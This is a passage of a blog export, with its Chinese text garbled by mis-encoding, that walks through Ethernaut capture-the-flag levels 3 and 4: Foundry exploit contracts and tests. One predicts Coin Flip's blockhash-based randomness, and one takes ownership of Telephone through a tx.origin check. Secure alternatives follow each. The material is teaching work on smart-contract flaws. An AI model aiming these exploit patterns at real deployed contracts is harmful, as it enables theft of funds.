bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Coin Flip æ”»å‡»æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract CoinFlipTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é¢„æœŸè¾“å‡ºï¼š</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testCoinFlipExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># Round 1 - Wins: 1</span></span><br><span class=\"line\"><span class=\"comment\"># Round 2 - Wins: 2</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\"><span class=\"comment\"># Round 10 - Wins: 10</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful! 10 consecutive wins achieved.</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä½¿ç”¨-Chainlink-VRF-æ¨è\"><a href=\"#1-ä½¿ç”¨-Chainlink-VRF-æ¨è\" class=\"headerlink\" title=\"1. ä½¿ç”¨ Chainlink VRF (æ¨è)\"></a>1. ä½¿ç”¨ Chainlink VRF (æ¨è)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol&quot;;</span><br><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureCoinFlip is VRFConsumerBaseV2 &#123;</span><br><span class=\"line\">    VRFCoordinatorV2Interface COORDINATOR;</span><br><span class=\"line\">    </span><br><span class=\"line\">    uint64 s_subscriptionId;</span><br><span class=\"line\">    bytes32 keyHash;</span><br><span class=\"line\">    uint32 callbackGasLimit = 100000;</span><br><span class=\"line\">    uint16 requestConfirmations = 3;</span><br><span class=\"line\">    uint32 numWords = 1;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(uint256 =&gt; address) public requestIdToSender;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(uint64 subscriptionId, address vrfCoordinator) </span><br><span class=\"line\">        VRFConsumerBaseV2(vrfCoordinator) &#123;</span><br><span class=\"line\">        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);</span><br><span class=\"line\">        s_subscriptionId = subscriptionId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function flip(bool _guess) public &#123;</span><br><span class=\"line\">        // è¯·æ±‚çœŸæ­£çš„éšæœºæ•°</span><br><span class=\"line\">        uint256 requestId = COORDINATOR.requestRandomWords(</span><br><span class=\"line\">            keyHash,</span><br><span class=\"line\">            s_subscriptionId,</span><br><span class=\"line\">            requestConfirmations,</span><br><span class=\"line\">            callbackGasLimit,</span><br><span class=\"line\">            numWords</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        requestIdToSender[requestId] = msg.sender;</span><br><span class=\"line\">        // å­˜å‚¨ç”¨æˆ·çš„çŒœæµ‹...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) </span><br><span class=\"line\">        internal override &#123;</span><br><span class=\"line\">        // ä½¿ç”¨çœŸæ­£çš„éšæœºæ•°å¤„ç†ç»“æœ</span><br><span class=\"line\">        bool side = (randomWords[0] % 2) == 1;</span><br><span class=\"line\">        address sender = requestIdToSender[requestId];</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å¤„ç†æ¸¸æˆé€»è¾‘...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ-æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"><a href=\"#2-ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ-æäº¤-æ­ç¤ºæ–¹æ¡ˆ\" class=\"headerlink\" title=\"2. ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ + æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"></a>2. ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ + æäº¤-æ­ç¤ºæ–¹æ¡ˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CommitRevealCoinFlip &#123;</span><br><span class=\"line\">    struct Game &#123;</span><br><span class=\"line\">        bytes32 commitment;</span><br><span class=\"line\">        uint256 revealBlock;</span><br><span class=\"line\">        bool revealed;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; Game) public games;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function commitFlip(bytes32 _commitment) public &#123;</span><br><span class=\"line\">        games[msg.sender] = Game(&#123;</span><br><span class=\"line\">            commitment: _commitment,</span><br><span class=\"line\">            revealBlock: block.number + 10, // 10ä¸ªåŒºå—åæ‰èƒ½æ­ç¤º</span><br><span class=\"line\">            revealed: false</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function revealFlip(bool _guess, uint256 _nonce) public &#123;</span><br><span class=\"line\">        Game storage game = games[msg.sender];</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(block.number &gt;= game.revealBlock, &quot;Too early to reveal&quot;);</span><br><span class=\"line\">        require(!game.revealed, &quot;Already revealed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ‰¿è¯º</span><br><span class=\"line\">        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));</span><br><span class=\"line\">        require(hash == game.commitment, &quot;Invalid commitment&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ</span><br><span class=\"line\">        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));</span><br><span class=\"line\">        bool result = (futureBlockHash % 2) == 1;</span><br><span class=\"line\">        </span><br><span class=\"line\">        game.revealed = true;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å¤„ç†ç»“æœ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å¤šæºç†µç»„åˆ\"><a href=\"#3-å¤šæºç†µç»„åˆ\" class=\"headerlink\" title=\"3. å¤šæºç†µç»„åˆ\"></a>3. å¤šæºç†µç»„åˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MultiSourceRandom &#123;</span><br><span class=\"line\">    uint256 private nonce;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getRandomNumber() private returns (uint256) &#123;</span><br><span class=\"line\">        // âš ï¸ ä»ä¸å¤Ÿå®‰å…¨ï¼Œä»…ä½œæ•™å­¦ç¤ºä¾‹</span><br><span class=\"line\">        nonce++;</span><br><span class=\"line\">        return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">            block.difficulty,    // çŸ¿å·¥å¯æ“æ§</span><br><span class=\"line\">            block.timestamp,     // çŸ¿å·¥å¯å°å¹…æ“æ§</span><br><span class=\"line\">            msg.sender,</span><br><span class=\"line\">            nonce,</span><br><span class=\"line\">            blockhash(block.number - 1)</span><br><span class=\"line\">        )));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\"><a href=\"#1-åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\" class=\"headerlink\" title=\"1. åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\"></a>1. åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº</h3><table>\n<thead>\n<tr>\n<th>æ•°æ®æº</th>\n<th>å®‰å…¨æ€§</th>\n<th>æ“æ§éš¾åº¦</th>\n<th>æ¨èä½¿ç”¨</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>block.timestamp</code></td>\n<td>âŒ æä½</td>\n<td>å®¹æ˜“</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><code>block.difficulty</code></td>\n<td>âŒ ä½</td>\n<td>ä¸­ç­‰</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><code>blockhash</code></td>\n<td>âŒ ä½</td>\n<td>å›°éš¾</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><code>keccak256(ç»„åˆ)</code></td>\n<td>âŒ ä½</td>\n<td>å–å†³äºç»„åˆ</td>\n<td>å¦</td>\n</tr>\n<tr>\n<td><strong>Chainlink VRF</strong></td>\n<td>âœ… é«˜</td>\n<td>æå›°éš¾</td>\n<td><strong>æ˜¯</strong></td>\n</tr>\n</tbody></table>\n<h3 id=\"2-æ”»å‡»è€…çš„ä¼˜åŠ¿\"><a href=\"#2-æ”»å‡»è€…çš„ä¼˜åŠ¿\" class=\"headerlink\" title=\"2. æ”»å‡»è€…çš„ä¼˜åŠ¿\"></a>2. æ”»å‡»è€…çš„ä¼˜åŠ¿</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ”»å‡»è€…å¯ä»¥ï¼š</span><br><span class=\"line\">// 1. åœ¨åŒä¸€äº¤æ˜“ä¸­æ‰§è¡Œç›¸åŒè®¡ç®—</span><br><span class=\"line\">// 2. é¢„å…ˆéªŒè¯ç»“æœï¼Œåªåœ¨æœ‰åˆ©æ—¶æäº¤</span><br><span class=\"line\">// 3. ä½¿ç”¨åˆçº¦è‡ªåŠ¨åŒ–æ”»å‡»</span><br><span class=\"line\"></span><br><span class=\"line\">contract SmartAttacker &#123;</span><br><span class=\"line\">    function conditionalAttack(CoinFlip target, bool guess) public &#123;</span><br><span class=\"line\">        // é¢„å…ˆè®¡ç®—</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool predictedSide = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // åªåœ¨é¢„æµ‹æ­£ç¡®æ—¶æ‰æ”»å‡»</span><br><span class=\"line\">        if (predictedSide == guess) &#123;</span><br><span class=\"line\">            target.flip(guess);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // å¦åˆ™ä»€ä¹ˆéƒ½ä¸åšï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªæœ‰åˆ©æœºä¼š</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-çœŸéšæœºæ•°-vs-ä¼ªéšæœºæ•°\"><a href=\"#3-çœŸéšæœºæ•°-vs-ä¼ªéšæœºæ•°\" class=\"headerlink\" title=\"3. çœŸéšæœºæ•° vs ä¼ªéšæœºæ•°\"></a>3. çœŸéšæœºæ•° vs ä¼ªéšæœºæ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¼ªéšæœºæ•°ï¼ˆç¡®å®šæ€§ï¼‰</span><br><span class=\"line\">function badRandom() public view returns (uint256) &#123;</span><br><span class=\"line\">    return uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">        block.timestamp,</span><br><span class=\"line\">        block.difficulty,</span><br><span class=\"line\">        msg.sender</span><br><span class=\"line\">    )));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… çœŸéšæœºæ•°ï¼ˆä½¿ç”¨é¢„è¨€æœºï¼‰</span><br><span class=\"line\">function goodRandom() public &#123;</span><br><span class=\"line\">    // é€šè¿‡ Chainlink VRF è¯·æ±‚çœŸæ­£çš„éšæœºæ•°</span><br><span class=\"line\">    requestRandomness(keyHash, fee);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å†å²æ¡ˆä¾‹\"><a href=\"#ğŸ›ï¸-å†å²æ¡ˆä¾‹\" class=\"headerlink\" title=\"ğŸ›ï¸ å†å²æ¡ˆä¾‹\"></a>ğŸ›ï¸ å†å²æ¡ˆä¾‹</h2><h3 id=\"è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\"><a href=\"#è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\" class=\"headerlink\" title=\"è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\"></a>è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶</h3><ol>\n<li><p><strong>SmartBillions</strong> (2017)</p>\n<ul>\n<li>æŸå¤±: 400 ETH</li>\n<li>åŸå› : ä½¿ç”¨ <code>block.blockhash</code> ä½œä¸ºéšæœºæº</li>\n<li>æ”»å‡»: é¢„æµ‹æœªæ¥åŒºå—å“ˆå¸Œ</li>\n</ul>\n</li>\n<li><p><strong>Fomo3D</strong> (2018)</p>\n<ul>\n<li>å½±å“: æ¸¸æˆæœºåˆ¶è¢«æ“æ§</li>\n<li>åŸå› : ä½¿ç”¨å¯é¢„æµ‹çš„æ—¶é—´æˆ³</li>\n<li>åæœ: å¥–æ± åˆ†é…ä¸å…¬</li>\n</ul>\n</li>\n<li><p><strong>TheRun</strong> (2019)</p>\n<ul>\n<li>æŸå¤±: å¤§é‡ä»£å¸</li>\n<li>åŸå› : å¤æ‚ä½†ä»å¯é¢„æµ‹çš„éšæœºæ•°ç®—æ³•</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Coin Flip å…³å¡æ­ç¤ºäº†åŒºå—é“¾éšæœºæ•°çš„æ ¹æœ¬é—®é¢˜ï¼š</p>\n<ul>\n<li>âœ… <strong>åŒºå—é“¾æ˜¯ç¡®å®šæ€§ç³»ç»Ÿ</strong> - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º</li>\n<li>âœ… <strong>é€æ˜æ€§å¸¦æ¥å¯é¢„æµ‹æ€§</strong> - æ‰€æœ‰æ•°æ®éƒ½æ˜¯å…¬å¼€çš„</li>\n<li>âœ… <strong>çœŸéšæœºæ•°éœ€è¦å¤–éƒ¨ç†µæº</strong> - å¿…é¡»ä¾èµ–é“¾ä¸‹éšæœºæ€§</li>\n<li>âœ… <strong>é¢„è¨€æœºæ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆ</strong> - Chainlink VRF ç­‰æœåŠ¡</li>\n</ul>\n<p>è¿™ä¸ªçœ‹ä¼¼ç®€å•çš„çŒœç¡¬å¸æ¸¸æˆï¼Œå®é™…ä¸Šæ¶‰åŠå¯†ç å­¦ã€æ¦‚ç‡è®ºå’Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ·±å±‚æ¦‚å¿µã€‚ç†è§£å…¶åŸç†å¯¹äºæ„å»ºå®‰å…¨çš„æ™ºèƒ½åˆçº¦è‡³å…³é‡è¦ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">ä¸Šä¸€å…³: Level 2 - Fallout</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">ä¸‹ä¸€å…³: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.chain.link/vrf/v2/introduction\">Chainlink VRF æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>åœ¨åŒºå—é“¾çš„ç¡®å®šæ€§ä¸–ç•Œä¸­ï¼ŒçœŸæ­£çš„éšæœºæ€§æ˜¯ä¸€ç§çè´µçš„èµ„æºã€‚</em> ğŸ²</p>\n"},{"title":"Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡","date":"2025-01-25T07:00:00.000Z","updated":"2025-01-25T07:00:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥ç†è§£ tx.origin å’Œ msg.sender çš„åŒºåˆ«ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨ä¸­é—´åˆçº¦ç»•è¿‡èº«ä»½éªŒè¯æœºåˆ¶ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 4 - Telephone](https://ethernaut.openzeppelin.com/level/4)  \n> **æ”»å‡»ç±»å‹**: èº«ä»½éªŒè¯ç»•è¿‡ã€ä¸­é—´åˆçº¦æ”»å‡»  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸º `Telephone` åˆçº¦çš„ `owner`\n2. **ç†è§£èº«ä»½æœºåˆ¶** - æŒæ¡ `tx.origin` å’Œ `msg.sender` çš„åŒºåˆ«\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Telephone {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        // ğŸš¨ æ¼æ´ï¼šä½¿ç”¨ tx.origin è¿›è¡Œèº«ä»½éªŒè¯\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n```\n\n### å…³é”®æ¦‚å¿µå¯¹æ¯”\n\n| å±æ€§ | `msg.sender` | `tx.origin` |\n|------|--------------|-------------|\n| **å®šä¹‰** | ç›´æ¥è°ƒç”¨è€… | äº¤æ˜“å‘èµ·è€… |\n| **å˜åŒ–** | æ¯æ¬¡è°ƒç”¨éƒ½å¯èƒ½å˜åŒ– | æ•´ä¸ªäº¤æ˜“é“¾ä¸­ä¸å˜ |\n| **å®‰å…¨æ€§** | âœ… å®‰å…¨ | âŒ å±é™© |\n| **æ¨èä½¿ç”¨** | èº«ä»½éªŒè¯ | ä»…ç”¨äºæ—¥å¿—è®°å½• |\n\n### æ”»å‡»åŸç†\n\nå½“æˆ‘ä»¬é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨æ—¶ï¼š\n- `tx.origin` = ç”¨æˆ·åœ°å€ (äº¤æ˜“å‘èµ·è€…)\n- `msg.sender` = æ”»å‡»åˆçº¦åœ°å€ (ç›´æ¥è°ƒç”¨è€…)\n- ç”±äº `tx.origin != msg.sender`ï¼Œæ¡ä»¶æ»¡è¶³ï¼Œå¯ä»¥ä¿®æ”¹ owner\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Telephone.sol\";\n\ncontract TelephoneAttacker {\n    Telephone public target;\n    \n    constructor(address _target) {\n        target = Telephone(_target);\n    }\n    \n    function attack(address _newOwner) public {\n        // é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨ï¼Œä½¿ tx.origin â‰  msg.sender\n        target.changeOwner(_newOwner);\n    }\n}\n\ncontract TelephoneTest is Test {\n    Telephone public telephone;\n    TelephoneAttacker public attacker;\n    \n    address public user = makeAddr(\"user\");\n    address public newOwner = makeAddr(\"newOwner\");\n\n    function setUp() public {\n        telephone = new Telephone();\n        attacker = new TelephoneAttacker(address(telephone));\n    }\n\n    function testTelephoneExploit() public {\n        vm.startPrank(user);\n        \n        // é€šè¿‡ä¸­é—´åˆçº¦æ”»å‡»\n        attacker.attack(newOwner);\n        \n        vm.stopPrank();\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(telephone.owner(), newOwner);\n        console.log(\"Attack successful! New owner:\", telephone.owner());\n    }\n}\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### ä½¿ç”¨ msg.sender è¿›è¡Œèº«ä»½éªŒè¯\n\n```solidity\ncontract SecureTelephone {\n    address public owner;\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not the owner\");\n        _;\n    }\n    \n    function changeOwner(address _newOwner) public onlyOwner {\n        owner = _newOwner;\n    }\n}\n```\n\n## ğŸ¯ æ€»ç»“\n\nTelephone å…³å¡æ•™å¯¼æˆ‘ä»¬ï¼š\n- âœ… æ°¸è¿œä¸è¦ä½¿ç”¨ `tx.origin` è¿›è¡Œèº«ä»½éªŒè¯\n- âœ… ä½¿ç”¨ `msg.sender` è¿›è¡Œå®‰å…¨çš„èº«ä»½æ£€æŸ¥\n- âœ… ç†è§£è°ƒç”¨é“¾ä¸­çš„èº«ä»½ä¼ é€’æœºåˆ¶\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 3 - Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)**\n- **[ä¸‹ä¸€å…³: Level 5 - Token](/2025/01/25/ethernaut-level-05-token/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**","source":"_posts/ethernaut-level-04-telephone.md","raw":"---\ntitle: 'Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡'\ndate: 2025-01-25 15:00:00\nupdated: 2025-01-25 15:00:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - tx.origin\n  - msg.sender\n  - èº«ä»½éªŒè¯ç»•è¿‡\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥ç†è§£ tx.origin å’Œ msg.sender çš„åŒºåˆ«ï¼Œå­¦ä¹ å¦‚ä½•åˆ©ç”¨ä¸­é—´åˆçº¦ç»•è¿‡èº«ä»½éªŒè¯æœºåˆ¶ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 4: Telephone - tx.origin vs msg.sender èº«ä»½éªŒè¯ç»•è¿‡\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 4 - Telephone](https://ethernaut.openzeppelin.com/level/4)  \n> **æ”»å‡»ç±»å‹**: èº«ä»½éªŒè¯ç»•è¿‡ã€ä¸­é—´åˆçº¦æ”»å‡»  \n> **éš¾åº¦**: â­â­â˜†â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n1. **è·å–åˆçº¦æ§åˆ¶æƒ** - æˆä¸º `Telephone` åˆçº¦çš„ `owner`\n2. **ç†è§£èº«ä»½æœºåˆ¶** - æŒæ¡ `tx.origin` å’Œ `msg.sender` çš„åŒºåˆ«\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### åˆçº¦æºç åˆ†æ\n\n```solidity\npragma solidity ^0.8.0;\n\ncontract Telephone {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        // ğŸš¨ æ¼æ´ï¼šä½¿ç”¨ tx.origin è¿›è¡Œèº«ä»½éªŒè¯\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n```\n\n### å…³é”®æ¦‚å¿µå¯¹æ¯”\n\n| å±æ€§ | `msg.sender` | `tx.origin` |\n|------|--------------|-------------|\n| **å®šä¹‰** | ç›´æ¥è°ƒç”¨è€… | äº¤æ˜“å‘èµ·è€… |\n| **å˜åŒ–** | æ¯æ¬¡è°ƒç”¨éƒ½å¯èƒ½å˜åŒ– | æ•´ä¸ªäº¤æ˜“é“¾ä¸­ä¸å˜ |\n| **å®‰å…¨æ€§** | âœ… å®‰å…¨ | âŒ å±é™© |\n| **æ¨èä½¿ç”¨** | èº«ä»½éªŒè¯ | ä»…ç”¨äºæ—¥å¿—è®°å½• |\n\n### æ”»å‡»åŸç†\n\nå½“æˆ‘ä»¬é€šè¿‡ä¸­é—´åˆçº¦è°ƒç”¨æ—¶ï¼š\n- `tx.origin` = 